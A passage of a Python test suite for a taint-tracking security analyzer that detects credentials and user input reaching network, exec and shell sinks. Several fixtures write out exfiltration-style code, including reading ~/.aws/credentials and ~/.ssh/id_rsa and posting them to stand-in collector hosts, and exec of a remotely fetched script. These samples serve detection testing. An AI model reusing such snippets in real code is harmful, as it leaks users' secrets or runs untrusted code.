    ``headers`` in one function tainted every unrelated variable or parameter
    called ``headers`` in the file, reporting TT3 (CRITICAL) on sinks that never
    see the credential.
    """

    def test_parameter_named_like_a_tainted_local_is_not_tainted(self) -> None:
        helper = _code(
            """
            def fetch(url, headers):
                return requests.get(url, headers=headers)
            """
        )
        caller = _code(
            """
            def main():
                headers = {"Authorization": os.getenv("API_TOKEN")}
                print(headers)
                fetch("https://example.invalid/v1", {"Accept": "application/json"})
            """
        )
        # Definition order must not matter either way.
        for body in (helper + caller, caller + helper):
            assert _flows("import os, requests\n" + body) == []

    def test_same_local_name_in_two_functions_is_not_shared(self) -> None:
        code = _code(
            """
            import os, requests
            def read_token():
                token = os.getenv("API_TOKEN")
                return len(token)
            def send_public():
                token = "public"
                requests.post("https://example.invalid", data=token)
            """
        )
        assert _flows(code) == []

    def test_method_parameter_named_like_a_tainted_local_is_not_tainted(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                def check(self):
                    token = os.getenv("API_TOKEN")
                    return bool(token)
                def send(self, token):
                    requests.post("https://example.invalid", data=token)
            Client().send("public")
            """
        )
        assert _flows(code) == []

    def test_local_shadowing_a_tainted_global_is_not_tainted(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def send():
                TOKEN = "public"
                requests.post("https://example.invalid", data=TOKEN)
            """
        )
        assert _flows(code) == []

    def test_only_the_parameter_receiving_the_secret_is_tainted(self) -> None:
        code = _code(
            """
            import os, requests
            def upload(url, payload):
                requests.get(url)  # CLEAN
                requests.post(url, data=payload)  # SINK
            def main():
                upload("https://example.invalid", os.getenv("API_TOKEN"))
            """
        )
        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]

    def test_instance_attributes_are_per_class(self) -> None:
        code = _code(
            """
            import os, requests
            class Secret:
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
            class Public:
                def __init__(self):
                    self.token = "public"
                def send(self):
                    requests.post("https://example.invalid", data=self.token)
            """
        )
        assert _flows(code) == []


class TestInterproceduralFlows:
    """Scoping must not lose flows that cross function boundaries."""

    def test_helper_return_assigned_to_the_same_name(self) -> None:
        code = _code(
            """
            import os, requests
            def get_key():
                key = os.getenv("API_KEY")
                return key
            def send():
                key = get_key()
                requests.post("https://example.invalid", data=key)  # SINK
            """
        )
        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]

    def test_helper_return_assigned_to_another_name(self) -> None:
        code = _code(
            """
            import os, requests
            def get_key():
                return os.getenv("API_KEY")
            def send():
                value = get_key()
                requests.post("https://example.invalid", data=value)  # SINK
            """
        )
        assert [f.start_line for f in _flows(code)] == [_line(code, "# SINK")]

    def test_helper_called_inside_the_sink_arguments(self) -> None:
        code = _code(
            """
            import os, requests
            def get_key():
                return os.environ["API_KEY"]
            requests.post("https://example.invalid", data=get_key())
            """
        )
        (finding,) = _flows(code)
        assert "'get_key()'" in finding.message

    def test_chained_helper_returns(self) -> None:
        code = _code(
            """
            import os, requests
            def raw():
                return os.getenv("API_KEY")
            def normalized():
                return raw().strip()
            requests.post("https://example.invalid", data=normalized())
            """
        )
        assert len(_flows(code)) == 1

    def test_secret_bound_to_a_parameter(self) -> None:
        for call in (
            "upload(secret)",
            "upload(payload=secret)",
            "upload(*[secret])",
            "upload(**{'payload': secret})",
            'upload(os.getenv("API_KEY"))',
        ):
            code = _code(
                f"""
                import os, requests
                def upload(payload):
                    requests.post("https://example.invalid", data=payload)
                def main():
                    secret = os.getenv("API_KEY")
                    {call}
                """
            )
            assert len(_flows(code)) == 1, call

    def test_varargs_kwargs_and_defaults_receive_secrets(self) -> None:
        for definition, call in (
            ("def send(*value):", 'send("x", os.getenv("API_KEY"))'),
            ("def send(**value):", 'send(key=os.getenv("API_KEY"))'),
            ('def send(value=os.getenv("API_KEY")):', "send()"),
        ):
            code = _code(
                f"""
                import os, requests
                {definition}
                    requests.post("https://example.invalid", data=value)
                {call}
                """
            )
            assert len(_flows(code)) == 1, definition

    def test_function_passed_as_a_callback_receives_following_arguments(self) -> None:
        for call in (
            "threading.Thread(target=upload, args=(secret,)).start()",
            "executor.submit(upload, secret)",
        ):
            code = _code(
                f"""
                import os, requests, threading
                def upload(body):
                    requests.post("https://example.invalid", data=body)
                def main(executor):
                    secret = os.getenv("API_KEY")
                    {call}
                """
            )
            assert len(_flows(code)) == 1, call

    def test_global_assigned_inside_a_function(self) -> None:
        code = _code(
            """
            import os, requests
            def configure():
                global TOKEN
                TOKEN = os.getenv("API_TOKEN")
            def send():
                requests.post("https://example.invalid", data=TOKEN)
            """
        )
        assert len(_flows(code)) == 1

    def test_closures_and_nested_functions(self) -> None:
        """Nested functions see enclosing locals and bind arguments lexically."""
        free_variable = _code(
            """
            import os, requests
            def outer():
                token = os.getenv("API_TOKEN")
                def inner():
                    requests.post("https://example.invalid", data=token)
                inner()
            """
        )
        bound_argument = _code(
            """
            import os, requests
            def outer():
                token = os.getenv("API_TOKEN")
                def inner(value):
                    requests.post("https://example.invalid", data=value)
                inner(token)
            """
        )
        nonlocal_rebinding = _code(
            """
            import os, requests
            def outer():
                token = None
                def load():
                    nonlocal token
                    token = os.getenv("API_TOKEN")
                load()
                requests.post("https://example.invalid", data=token)
            """
        )
        for code in (free_variable, bound_argument, nonlocal_rebinding):
            assert len(_flows(code)) == 1, code

    def test_instance_attribute_set_in_init(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
                def send(self):
                    token = self.token
                    requests.post("https://example.invalid", data=token)
            """
        )
        assert len(_flows(code)) == 1

    def test_constructor_argument_stored_on_self(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                def __init__(self, token):
                    self.token = token
                def send(self):
                    requests.post("https://example.invalid", headers={"A": self.token})
            Client(os.getenv("API_TOKEN")).send()
            """
        )
        assert len(_flows(code)) == 1

    def test_class_attribute_read_through_self(self) -> None:
        code = _code(
            """
            import os, requests
            class Client:
                TOKEN = os.getenv("API_TOKEN")
                def send(self):
                    requests.post("https://example.invalid", headers={"A": self.TOKEN})
            """
        )
        assert len(_flows(code)) == 1

    def test_attribute_set_in_base_class_read_in_subclass(self) -> None:
        code = _code(
            """
            import os, requests
            class Base:
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
            class Child(Base):
                def send(self):
                    requests.post("https://example.invalid", data=self.token)
            """
        )
        assert len(_flows(code)) == 1

    def test_method_calls_bind_arguments(self) -> None:
        on_instance = _code(
            """
            import os, requests
            class Api:
                def upload(self, body):
                    requests.post("https://example.invalid", data=body)
            def main():
                api = Api()
                api.upload(os.getenv("API_TOKEN"))
            """
        )
        on_self = _code(
            """
            import os, requests
            class Api:
                def _send(self, body):
                    requests.post("https://example.invalid", data=body)
                def run(self):
                    self._send(os.getenv("API_TOKEN"))
            """
        )
        static = _code(
            """
            import os, requests
            class Api:
                @staticmethod
                def send(body):
                    requests.post("https://example.invalid", data=body)
            Api.send(os.getenv("API_TOKEN"))
            """
        )
        for code in (on_instance, on_self, static):
            assert len(_flows(code)) == 1, code

    def test_user_input_reaching_exec_through_a_helper(self) -> None:
        code = _code(
            """
            import subprocess
            def run(command):
                subprocess.run(command, shell=True)
            run(input())
            """
        )
        assert len(_flows(code, "TT5")) == 1

    def test_recursive_helpers_terminate(self) -> None:
        code = _code(
            """
            import os, requests
            def ping(value):
                requests.post("https://example.invalid", data=value)
                return pong(value)
            def pong(value):
                return ping(value)
            ping(os.getenv("API_TOKEN"))
            """
        )
        assert len(_flows(code)) == 1

    def test_token_from_helper_header_builder_reaches_request(self) -> None:
        """A token loaded by a helper, put in an auth header and sent, is TT3."""
        code = _code(
            """
            import os, requests
            def load_token():
                token = os.getenv("SERVICE_TOKEN")  # SOURCE
                return token.strip() if token else None
            def auth_headers(token=None):
                if token is None:
                    token = load_token()
                return {"Authorization": f"Bearer {token}"}
            def service_get(url, *, headers=None):
                request_headers = dict(headers or {})  # COPY
                return requests.get(url, headers=request_headers)  # SINK
            def check(url):
                return service_get(url, headers=auth_headers())
            """
        )
        (finding,) = _flows(code)
        assert finding.start_line == _line(code, "# SINK")
        assert f"'request_headers' from os.getenv (line {_line(code, '# COPY')}," in (
            finding.message
        )


class TestMessageCompatibility:
    """Messages keep the wording earlier releases used.

    Exact baseline fingerprints and message-glob baseline rules include the
    message, so a flow both versions report must produce the same text: the
    variable read at the sink and the line of the statement that last tainted
    it (not the line of the original source call).
    """

    def test_reassignment_chain_cites_the_last_assignment(self) -> None:
        code = _code(
            """
            import os, requests
            secret = os.getenv("API_KEY")
            first = secret
            second = first
            requests.post("https://example.invalid", data=second)
            """
        )
        (finding,) = _flows(code)
        assert finding.message == (
            "Tainted flow: 'second' from os.getenv (line 4, credential/environment) "
            "→ requests.post (network output)"
        )

    def test_multiline_assignment_cites_the_assignment_line(self) -> None:
        code = _code(
            """
            import os, requests
            payload = {  # ASSIGN
                "user": "example",
                "key": os.getenv("API_KEY"),
            }
            requests.post("https://example.invalid", json=payload)
            """
        )
        (finding,) = _flows(code)
        assert f"'payload' from os.getenv (line {_line(code, '# ASSIGN')}," in finding.message

    def test_plain_variable_is_cited_before_a_helper_result(self) -> None:
        """A sink reading both a variable and a helper result cites the variable."""
        code = _code(
            """
            import os, subprocess
            def build(args):
                return ["ssh", *args]
            args = input("args: ")
            subprocess.run(build(args))
            """
        )
        (finding,) = _flows(code, "TT5")
        assert finding.message == (
            "Tainted flow: 'args' from input (line 4, user input) → subprocess.run (code execution)"
        )

    def test_cross_function_flow_cites_the_binding_call(self) -> None:
        code = _code(
            """
            import os, requests
            def upload(payload):
                requests.post("https://example.invalid", data=payload)
            def main():
                secret = os.getenv("API_KEY")
                upload(secret)  # CALL
            """
        )
        (finding,) = _flows(code)
        assert f"'payload' from os.getenv (line {_line(code, '# CALL')}," in finding.message


class TestInterproceduralBounds:
    """Call binding goes through per-callee argument slots, so it stays linear."""

    def test_many_same_named_methods_and_call_sites_bind_linearly(self, monkeypatch) -> None:
        """N methods named ``put`` and N ``obj.put(secret)`` calls: O(N), not O(N^2)."""
        count = 400
        classes = "\n".join(
            f"class Store{i}:\n    def put(self, value):\n        return value"
            for i in range(count)
        )
        calls = "\n".join(f"    store{i}.put(secret)" for i in range(count))
        code = (
            "import os\n"
            f"{classes}\n"
            "def main(" + ", ".join(f"store{i}" for i in range(count)) + "):\n"
            '    secret = os.getenv("API_KEY")\n'
            f"{calls}\n"
        )
        calls_made = {"n": 0}
        original = behavioral_taint_tracking._mark_targets

        def counting_mark_targets(*args, **kwargs):
            calls_made["n"] += 1
            return original(*args, **kwargs)

        monkeypatch.setattr(behavioral_taint_tracking, "_mark_targets", counting_mark_targets)
        start = time.monotonic()
        sources = _collect(code, _capped_check_runtime(count * 200))
        elapsed = time.monotonic() - start

        # Every method's parameter is reached through the shared argument slot.
        assert sum(1 for key in sources if key.endswith(".<locals>.value")) == count
        # A per-pair binding would fire count * count edges.
        assert calls_made["n"] <= 10 * count
        assert elapsed < 2.0

    def test_positional_arguments_beyond_the_slot_cap_still_bind(self) -> None:
        width = behavioral_taint_tracking._MAX_POSITIONAL_SLOTS + 4
        params = ", ".join(f"p{i}" for i in range(width))
        args = ", ".join('os.getenv("API_KEY")' if i == width - 1 else str(i) for i in range(width))
        code = (
            "import os, requests\n"
            f"def send({params}):\n"
            f'    requests.post("https://example.invalid", data=p{width - 1})\n'
            f"send({args})\n"
        )
        assert len(_flows(code)) == 1

    def test_key_memory_does_not_grow_with_identifier_length(self) -> None:
        """Keys never embed qualified names, so memory is independent of name length.

        Taint keys built as ``qualname + name`` copied a long function, class or
        method name into every local, attribute, argument slot and untyped
        ``obj.m(...)`` fallback binding: memory grew as name length times
        references, so a sub-megabyte file could exhaust host memory.
        """

        def module(length: int) -> str:
            function, cls, method = "f" * length, "C" * length, "m" * length
            lines = [
                "import os",
                f"def {function}(*args, **kwargs):",
                "    return args",
                f"{function}(" + "x, " * 3000 + "y=x)",
                f"def {function}_locals():",
                *(f"    v{i} = os.getenv('K')" for i in range(1500)),
                f"class {cls}:",
                "    def store(self, y):",
                *(f"        self.a{i} = y" for i in range(1500)),
                *(
                    f"class K{i}:\n    def {method}(self, a, b):\n        return a"
                    for i in range(30)
                ),
                "def run(o, x):",
                *(f"    o.{method}(x, os.getenv('K'))" for _ in range(40)),
            ]
            return "\n".join(lines) + "\n"

        def peak_bytes(code: str) -> int:
            parsed = get_python_ast(None, code, "t.py")
            type_map = build_type_map(parsed.tree, parsed.import_aliases)
            tracemalloc.start()
            try:
                index = behavioral_taint_tracking._build_scope_index(
                    parsed.tree, parsed.import_aliases, type_map
                )
                graph = behavioral_taint_tracking._TaintGraph(
                    index, type_map, parsed.import_aliases
                )
                graph.run()
                assert graph.facts  # the flows above do propagate
                return tracemalloc.get_traced_memory()[1]
            finally:
                tracemalloc.stop()

        short = peak_bytes(module(8))
        long = peak_bytes(module(5000))
        # Qualified keys would cost ~5000 bytes x ~9000 references (~45 MB) more.
        assert long - short < 2 * 2**20

    def test_same_named_classes_resolve_each_call_once(self) -> None:
        """Thousands of redefinitions of one class plus calls stay linear.

        Redefinitions of a name merge into one class, and method lookups are
        cached, so ``C()`` / ``c.m(x)`` / ``C(x).m(x)`` cost the same whether
        ``C`` is defined once or thousands of times.
        """
        count = 6000
        definition = (
            "class C:\n    def __init__(self, a):\n        self.a = a\n"
            "    def m(self, x):\n        return x\n"
        )
        code = definition * count + "c = C(1)\nc.m(1)\nC(2).m(2)\n" * count
        parsed = get_python_ast(None, code, "t.py")
        start = time.monotonic()
        index = behavioral_taint_tracking._build_scope_index(
            parsed.tree, parsed.import_aliases, {}, _capped_check_runtime(count * 200)
        )
        behavioral_taint_tracking._TaintGraph(
            index, {}, parsed.import_aliases, _capped_check_runtime(count * 200)
        ).run()
        elapsed = time.monotonic() - start
        assert len(index.logical) == 1
        # Each (class, method) is looked up once, however many calls use it.
        assert len(index._methods) <= 4
        assert elapsed < 4.0

    def test_deadline_is_checked_while_indexing_scopes(self) -> None:
        """Scope indexing checks the deadline per node, not only per function."""
        parsed = get_python_ast(None, "x + 1\n" * 20000, "t.py")
        with pytest.raises(_RuntimeBudgetError):
            behavioral_taint_tracking._build_scope_index(
                parsed.tree, parsed.import_aliases, {}, _capped_check_runtime(5000)
            )

    def test_deadline_is_checked_per_statement(self) -> None:
        """Calls that bind nothing still pass a deadline check each."""
        parsed = get_python_ast(None, "class C:\n    pass\n" + "C()\n" * 20000, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
        graph = behavioral_taint_tracking._TaintGraph(
            index, {}, parsed.import_aliases, _capped_check_runtime(5000)
        )
        with pytest.raises(_RuntimeBudgetError):
            graph.build()

    def test_deadline_is_checked_per_propagated_fact(self) -> None:
        depth = 20000
        code = (
            "import os\n"
            + "".join(f"a{i} = a{i - 1}\n" for i in range(depth, 0, -1))
            + 'a0 = os.getenv("K")\n'
        )
        parsed = get_python_ast(None, code, "t.py")
        index = behavioral_taint_tracking._build_scope_index(parsed.tree, parsed.import_aliases, {})
        graph = behavioral_taint_tracking._TaintGraph(index, {}, parsed.import_aliases)
        graph.build()
        graph.tick = _capped_check_runtime(depth // 2)
        with pytest.raises(_RuntimeBudgetError):
            graph.propagate()

    def test_workflow_deadline_stops_an_adversarial_file_promptly(self) -> None:
        """A crafted file cannot run the analyzer far past the workflow deadline."""
        code = "class C:\n    pass\n" * 30000 + "C()\n" * 60000
        start = time.monotonic()
        result = behavioral_taint_tracking.node(
            {
                "components": ["a.py"],
                "file_cache": {"a.py": code},
                "workflow_resource_budget": WorkflowResourceBudget(max_seconds=1.0),
            }
        )
        elapsed = time.monotonic() - start
        assert result["inspection_ledger"][0]["outcome"] in ("completed", "partial")
        assert elapsed < 8.0


def _summary(code: str) -> list[tuple[str, int]]:
    return sorted((f.rule_id, f.start_line) for f in _run(code))


class TestCallReceivers:
    """Method calls resolve through the receiver's class, scoped like any name."""

    _GITHUB = _code(
        """
        import os, requests
        class GitHub:
            def create_issue(self, token, body):
                requests.post("https://api.github.com/issues", headers={"A": token})  # SINK
        """
    )
    _MAIN = _code(
        """
        def main():
            client = GitHub()
            token = os.environ["GITHUB_TOKEN"]
            client.create_issue(token, {"title": "t"})
        """
    )
    _FETCH = _code(
        """
        def fetch(url):
            client = requests.Session()
            return client.get(url)
        """
    )

    def test_same_named_library_instance_elsewhere_does_not_hide_binding(self) -> None:
        for body in (self._MAIN + self._FETCH, self._FETCH + self._MAIN):
            code = self._GITHUB + body
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], body

    def test_untyped_parameter_receiver_binds_despite_library_instance_elsewhere(self) -> None:
        code = (
            self._GITHUB
            + _code(
                """
            def run(client):
                token = os.getenv("GITHUB_TOKEN")
                client.create_issue(token, {})
            """
            )
            + self._FETCH
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_typed_receiver_reads_only_its_own_class(self) -> None:
        code = _code(
            """
            import os, requests
            class Vault:
                def get(self, name):
                    return os.getenv(name)
            class Cache:
                def get(self, name):
                    return "public"
            def publish():
                c = Cache()
                val = c.get("status")
                requests.post("https://x.invalid", data=val)
            def load():
                c = Vault()
                return c.get("TOKEN")
            """
        )
        assert _summary(code) == []

    def test_typed_receiver_binds_only_its_own_class(self) -> None:
        code = _code(
            """
            import os, requests
            class Api:
                def upload(self, body):
                    print(body)
            class Mirror:
                def upload(self, body):
                    requests.post("https://example.invalid", data=body)
            def main():
                api = Api()
                api.upload(os.getenv("API_TOKEN"))
            """
        )
        assert _summary(code) == []

    def test_method_return_values_reach_the_caller(self) -> None:
        on_self = _code(
            """
            import os, requests
            class Client:
                def _token(self):
                    return os.getenv("API_TOKEN")  # RETURN
                def send(self):
                    requests.post("https://example.invalid", data=self._token())
            """
        )
        typed = _code(
            """
            import os, requests
            class Vault:
                def key(self):
                    return os.getenv("API_TOKEN")  # RETURN
            def main():
                vault = Vault()
                requests.post("https://example.invalid", data=vault.key())
            """
        )
        static = _code(
            """
            import os, requests
            class Vault:
                @staticmethod
                def key():
                    return os.getenv("API_TOKEN")  # RETURN
            requests.post("https://example.invalid", data=Vault.key())
            """
        )
        for code, label in ((on_self, "_token()"), (typed, "key()"), (static, "key()")):
            (finding,) = _flows(code)
            assert finding.message == (
                f"Tainted flow: '{label}' from os.getenv (line {_line(code, '# RETURN')}, "
                "credential/environment) → requests.post (network output)"
            )

    def test_returns_of_constructed_and_attribute_receivers(self) -> None:
        """``Cls().m()``, ``cls().m()``, ``self.attr.m()`` and annotated instances."""
        vault = _code(
            """
            import os, requests
            class Vault:
                def load(self):
                    secret = os.environ.get("OPENAI_API_KEY")
                    return secret
            """
        )
        callers = (
            "data = Vault().load()",
            "v: Vault = Vault()\ndata = v.load()",
        )
        for caller in callers:
            code = vault + caller + '\nrequests.post("https://x.invalid", data=data)\n'
            assert [f.rule_id for f in _run(code)] == ["TT3"], caller
        on_attribute = vault + _code(
            """
            class App:
                def __init__(self):
                    self.vault = Vault()
                def run(self):
                    requests.post("https://x.invalid", data=self.vault.load())
            """
        )
        from_classmethod = _code(
            """
            import os, requests
            class Vault:
                def load(self):
                    return os.environ.get("API_KEY")
                @classmethod
                def send(cls):
                    requests.post("https://x.invalid", data=cls().load())
            """
        )
        for code in (on_attribute, from_classmethod):
            assert [f.rule_id for f in _run(code)] == ["TT3"], code

    def test_constructed_receiver_returns_feed_exec_and_file_flows(self) -> None:
        exec_flow = _code(
            """
            import requests
            class Fetcher:
                def fetch(self):
                    code = requests.get("https://x.invalid/script").text
                    return code
            code = Fetcher().fetch()
            exec(code)
            """
        )
        file_flow = _code(
            """
            import os, requests
            class Reader:
                def read(self):
                    creds = open(os.path.expanduser("~/.aws/credentials")).read()
                    return creds
            creds = Reader().read()
            requests.post("https://x.invalid", data=creds)
            """
        )
        assert [f.rule_id for f in _run(exec_flow)] == ["TT5"]
        assert [f.rule_id for f in _run(file_flow)] == ["TT4"]

    def test_explicit_unbound_calls_bind_self_explicitly(self) -> None:
        """``Base.m(self, x)`` passes ``self`` as the first argument, not the receiver."""
        true_flow = _code(
            """
            import os, requests
            class Base:
                def __init__(self, token):
                    requests.post("https://x.invalid", data=token)  # SINK
            class Child(Base):
                def __init__(self):
                    token = os.getenv("TOKEN")
                    Base.__init__(self, token)
            """
        )
        shifted = _code(
            """
            import os, requests
            class Base:
                def __init__(self, user, body):
                    print(user)
                    requests.post("https://x.invalid", data=body)
            class Child(Base):
                def __init__(self):
                    Base.__init__(self, os.getenv("USER_NAME"), "public")
            """
        )
        thread = _code(
            """
            import os, requests, threading
            class Base:
                def send(self, payload):
                    requests.post("https://x.invalid", data=payload)  # SINK
            def main(obj):
                token = os.getenv("TOKEN")
                threading.Thread(target=Base.send, args=(obj, token)).start()
            """
        )
        assert _summary(true_flow) == [("TT3", _line(true_flow, "# SINK"))]
        assert _summary(shifted) == []
        assert _summary(thread) == [("TT3", _line(thread, "# SINK"))]

    def test_super_calls_follow_the_method_resolution_order(self) -> None:
        unrelated_init = _code(
            """
            import os, requests
            class Credentials:
                def __init__(self, token):
                    self.token = token
            class EnvCredentials(Credentials):
                def __init__(self):
                    super().__init__(os.environ.get("API_TOKEN"))
            class Downloader:
                def __init__(self, url):
                    self.url = url
                def fetch(self):
                    return requests.get(self.url, timeout=10)
            class ApiError(Exception):
                def __init__(self, message):
                    super().__init__(message)
            def run(cmd):
                raise ApiError(requests.get(cmd).text)
            """
        )
        returned = _code(
            """
            import os, requests
            class Base:
                def auth(self):
                    token = os.environ["TOKEN"]
                    return token
            class Child(Base):
                def send(self):
                    token = super().auth()
                    requests.post("https://x.invalid", data=token)  # ZERO_ARG
                def send2(self):
                    requests.post("https://x.invalid", data=super(Child, self).auth())  # TWO_ARG
            """
        )
        overridden = _code(
            """
            import os, requests
            class Base:
                def send(self, payload):
                    print(payload)
                def auth(self):
                    return "public"
            class Child(Base):
                def send(self, payload):
                    requests.post("https://x.invalid", data=payload)
                def auth(self):
                    return os.getenv("TOKEN")
                def run(self):
                    super().send(os.getenv("TOKEN"))
                    requests.post("https://x.invalid", data=super().auth())
            """
        )
        assert _summary(unrelated_init) == []
        assert _summary(overridden) == []
        assert _summary(returned) == [
            ("TT3", _line(returned, "# ZERO_ARG")),
            ("TT3", _line(returned, "# TWO_ARG")),
        ]

    def test_literal_receivers_never_bind_into_module_methods(self) -> None:
        code = _code(
            """
            import os, requests
            MODELS = {"small": "s"}
            class Uploader:
                def __init__(self, url):
                    self.url = url
                def format(self, record):
                    return requests.post(self.url, json={"record": record}, timeout=10)
                def get(self, model_id):
                    return requests.get(f"https://models.invalid/{model_id}")
            def banner():
                user = os.environ.get("USER", "unknown")
                return "Running as {}".format(user)
            def selected_model():
                options = {}
                options.get(os.environ.get("MODEL"))
                return MODELS.get(os.environ.get("MODEL_SIZE", "small"))
            """
        )
        assert _summary(code) == []

    def test_cls_constructor_and_property_reads(self) -> None:
        cls_constructor = _code(
            """
            import os, requests
            class Client:
                def __init__(self, token):
                    self.resp = requests.post("https://auth.invalid", data={"token": token})  # SINK
                @classmethod
                def from_env(cls):
                    token = os.environ.get("API_TOKEN")
                    return cls(token)
            """
        )
        on_self = _code(
            """
            import os, requests
            class Client:
                @property
                def api_key(self):
                    api_key = os.environ.get("API_KEY")
                    return api_key
                def call(self):
                    key = self.api_key
                    requests.post("https://x.invalid", headers={"X-API-Key": key})  # SINK
            """
        )
        on_instance = _code(
            """
            import os, requests
            class Config:
                @property
                def token(self):
                    return os.getenv("GITHUB_TOKEN")
            cfg = Config()
            requests.post("https://x.invalid", data=cfg.token)  # SINK
            """
        )
        for code in (cls_constructor, on_self, on_instance):
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code

    def test_callbacks_on_attribute_constructor_and_parameter_receivers(self) -> None:
        sender = _code(
            """
            import os, requests, threading
            class Sender:
                def send(self, token):
                    requests.post("https://x.invalid", data=token)  # SINK
            """
        )
        for setup, target in (
            ("self.sender = Sender()", "self.sender.send"),
            ("pass", "Sender().send"),
            ("pass", "sender.send"),
        ):
            code = sender + _code(
                f"""
                class App:
                    def __init__(self):
                        {setup}
                    def run(self, sender):
                        token = os.getenv("GITHUB_TOKEN")
                        threading.Thread(target={target}, args=(token,)).start()
                """
            )
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], target


class TestClassHierarchies:
    """Attributes and methods are shared along inheritance, not across siblings."""

    def test_sibling_subclasses_do_not_share_attributes(self) -> None:
        code = _code(
            """
            import os, requests
            class ChatProvider:
                def chat(self, messages):
                    raise NotImplementedError
            class NvidiaProvider(ChatProvider):
                def __init__(self):
                    self.headers = {"Authorization": os.environ.get("NVIDIA_API_KEY")}
                def chat(self, messages):
                    return requests.post("https://nvidia.invalid", headers=self.headers)  # REAL
            class OllamaProvider(ChatProvider):
                def __init__(self):
                    self.headers = {"Content-Type": "application/json"}
                def chat(self, messages):
                    return requests.post("http://localhost:11434", headers=self.headers)
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# REAL"))]

    def test_sibling_subclasses_do_not_share_methods(self) -> None:
        code = _code(
            """
            import os, requests
            class Backend:
                pass
            class CloudBackend(Backend):
                def auth_token(self):
                    return os.environ.get("CLOUD_TOKEN")
            class LocalBackend(Backend):
                def auth_token(self):
                    return "anonymous"
                def health(self):
                    return requests.get("http://localhost", params={"u": self.auth_token()})
            """
        )
        assert _summary(code) == []

    def test_attributes_meet_through_subclasses_and_mixins(self) -> None:
        set_in_subclass = _code(
            """
            import os, requests
            class Base:
                def send(self):
                    requests.post("https://x.invalid", data=self.token)  # SINK
            class Child(Base):
                def __init__(self):
                    self.token = os.getenv("API_TOKEN")
            """
        )
        mixin = _code(
            """
            import os, requests
            class TokenStore:
                def __init__(self):
                    self.token = os.environ.get("API_KEY")
            class SenderMixin:
                def send(self, url):
                    return requests.post(url, headers={"A": self.token})  # SINK
            class Client(TokenStore, SenderMixin):
                pass
            """
        )
        for code in (set_in_subclass, mixin):
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], code

    def test_overridden_method_in_subclass_is_reached_from_the_base(self) -> None:
        code = _code(
            """
            import os, requests
            class Base:
                def token(self):
                    return "public"
                def send(self):
                    requests.post("https://x.invalid", data=self.token())  # SINK
            class Child(Base):
                def token(self):
                    return os.getenv("API_TOKEN")
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]


class TestContextSensitivity:
    """One caller's secret must not taint other calls of the same helper."""

    def test_helper_result_is_tainted_only_where_the_secret_is_passed(self) -> None:
        code = _code(
            """
            import os, requests
            def _headers(token=None):
                h = {"Accept": "application/json"}
                if token:
                    h = {"Accept": "application/json", "Authorization": f"Bearer {token}"}
                return h
            def private_api():
                return requests.get("https://api.invalid/me", headers=_headers(os.environ["T"]))  # SINK
            def public_status():
                return requests.post("https://status.invalid/ping", headers=_headers())
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_pure_transform_helper_does_not_leak_between_callers(self) -> None:
        code = _code(
            """
            import os, json, requests
            def to_json(obj):
                return json.dumps(obj, indent=2)
            def save_config():
                cfg = {"api_key": os.getenv("API_KEY")}
                print(to_json(cfg))
            def report(results):
                requests.post("https://telemetry.invalid", data=to_json(results))
            """
        )
        assert _summary(code) == []

    def test_secrets_still_flow_through_helpers_globals_and_attributes(self) -> None:
        code = _code(
            """
            import os, requests
            CACHE = {}
            def remember(value):
                global TOKEN
                TOKEN = value
            class Holder:
                def keep(self, value):
                    self.value = value
                def send(self):
                    requests.post("https://x.invalid", data=self.value)  # ATTR
            def wrap(value):
                return {"v": value}
            def main(holder: Holder):
                secret = os.getenv("API_KEY")
                remember(secret)
                Holder().keep(secret)
                requests.post("https://x.invalid", json=wrap(secret))  # ARG
            def later():
                requests.post("https://x.invalid", data=TOKEN)  # GLOBAL
            """
        )
        assert _summary(code) == sorted(
            ("TT3", _line(code, marker)) for marker in ("# ATTR", "# ARG", "# GLOBAL")
        )

    def test_inline_source_through_a_helper_is_reported_once(self) -> None:
        network = _code(
            """
            import requests
            def wrap(text):
                return {"q": text}
            requests.post("https://api.invalid/search", json=wrap(input("query: ")))
            """
        )
        command = _code(
            """
            import os, subprocess
            def make_cmd(binary):
                return [binary, "--version"]
            subprocess.run(make_cmd(os.environ.get("TOOL_BIN")))
            """
        )
        assert [f.rule_id for f in _run(network)] == ["TT1"]
        assert [f.rule_id for f in _run(command)] == ["TT1"]


class TestMultipleSources:
    """A key keeps one fact per source; the sink reports the most severe rule."""

    def test_helper_defined_first_does_not_preempt_the_credential(self) -> None:
        code = _code(
            """
            import os, requests
            def nonce():
                return requests.get("https://collector.invalid/nonce").text
            def run():
                token = os.getenv("API_KEY")
                body = nonce() + token  # BODY
                requests.post("https://collector.invalid/upload", data=body)
            """
        )
        (finding,) = _run(code)
        assert finding.rule_id == "TT3"
        assert f"'body' from os.getenv (line {_line(code, '# BODY')}," in finding.message

    def test_file_read_helper_does_not_preempt_the_credential(self) -> None:
        code = _code(
            """
            import os, requests
            def read_key():
                return open(os.path.expanduser("~/.ssh/id_rsa")).read()
            def collect():
                aws = os.environ["AWS_SECRET_ACCESS_KEY"]
                loot = {"key": read_key(), "aws": aws}
                requests.post("https://collector.invalid/x", json=loot)
            """
        )
        assert [f.rule_id for f in _run(code)] == ["TT3"]

    def test_reassignment_keeps_the_most_severe_source_in_either_order(self) -> None:
        for first, second in (
            ('open("notes.txt").read()', 'os.getenv("KEY")'),
            ('os.getenv("KEY")', 'open("notes.txt").read()'),
        ):
            code = (
                "import os, requests\n"
                f"payload = {first}\n"
                f"payload = {second}\n"
                "body = payload\n"
                'requests.post("https://x.invalid", data=body)\n'
            )
            assert [f.rule_id for f in _run(code)] == ["TT3"], first


